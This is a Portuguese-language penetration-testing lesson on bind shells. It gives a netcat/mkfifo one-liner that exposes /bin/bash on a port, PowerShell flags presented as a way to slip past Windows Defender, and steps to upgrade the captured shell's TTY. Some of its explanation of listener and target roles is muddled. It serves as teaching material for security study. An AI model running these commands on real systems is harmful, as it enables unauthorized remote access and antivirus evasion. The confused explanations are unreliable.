# Bind shell
Bind shell é um shell que se conecta ao sistema alvo, que está ouvindo em uma porta específica. Depois de descobrir a brecha no sistema alvo, podemos usar ferramentas como netcat, socat ou até mesmo python para criar um shell bind. Depois disso executamos o shell no sistema falho e o atacante se conecta a nós.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Para burlar antivirus como o windows defender ao escrever um código em powershell, podemos usar o comando `powershell -NoP -NonI -W Hidden -Exec Bypass -Command` para executar o código sem que o windows defender detecte.

## Ouvinte netcat

Precisamos de um ouvinte para receber a conexão do shell bind, seja por nc, socket ou outro. 
```shell
$ nc 10.10.10.1 4444
```
Esse comando é executado em algum lugar do alvo que permita RCE (Remote Code Execution), como um arquivo PHP, um formulário de upload, um SQL Injection, depois nos conectamos ao ouvinte na porta especificada nesse comando.

## Melhorando o TTY
O TTY padrão que obtemos ao conseguir o shell é limitado, comandos como `clear`, `Ctrl+C`, `Ctrl+Z`, `Ctrl+D`, acesso do histórico de comandos e outros podem não funcionar corretamente, podemos melhorar a interação com o shell. 

**Nota: O método a seguir funciona apenas em sistemas com python instalado.**

TTY é o terminal do sistema, quando usamos um shell bind, o TTY pode não estar configurado corretamente, para melhorar o TTY, podemos usar o comando `python3 -c 'import pty; pty.spawn("/bin/bash")'` para melhorar a interação com o shell.

Depois apertamos *Ctrl+Z* para suspender o processo, depois usamos o comando `stty raw -echo; fg` para melhorar a interação com o shell.

fg trás o processo suspenso de volta, e stty raw -echo configura o TTY para melhorar a interação com o shell.

Quando executamos o comando `stty raw -echo`, o shell pode ficar sem echo, para resolver isso, usamos o comando `reset` + enter para corrigir o TTY.

Quando abrirmos o shell, ele pode não ocupar toda a janela do terminal, para resolver isso, usamos o comando `echo $TERM` em uma outra aba do terminal (no nosso sistema) para saber o tipo de terminal, depois usamos `stty size` para saber o tamanho da do nosso terminal. 

Supondo uma saida de stty size
`67    318`

Você deve imaginar o objetivo de todos esses comandos no nosso terminal, obviamente ficariamos mais confortáveis com um terminal idêntico ao nosso, para isso podemos

alterar a variável do terminal invadido
```bash
$ export TERM=xterm-256color

$ stty rows 67 columns 318
```

[próxima aula](shell3_web.md)
